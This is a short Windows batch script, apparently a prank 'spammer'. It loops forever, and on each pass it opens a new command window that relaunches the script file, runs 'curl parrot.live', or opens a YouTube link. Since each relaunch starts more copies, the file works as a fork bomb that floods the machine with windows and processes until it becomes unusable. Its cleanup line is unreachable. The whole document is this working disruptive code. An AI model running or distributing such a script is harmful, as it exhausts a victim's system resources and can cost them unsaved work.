@echo off
:main
set /a randomNum=(%random% %% 3) + 1
IF /i "%randomNum%"=="1" goto actionone
IF /i "%randomNum%"=="2" goto actiontwo
IF /i "%randomNum%"=="3" goto actionthree

echo error
goto exit



:actionone
start cmd /k %UserProfile%\spammeri3i.bat
goto main

:actiontwo
start cmd /k curl parrot.live
goto main

:actionthree
start https://youtube.com/watch?v=OjNpRbNdR7E
goto main

:exit
del %UserProfile%\spammeri3i.bat
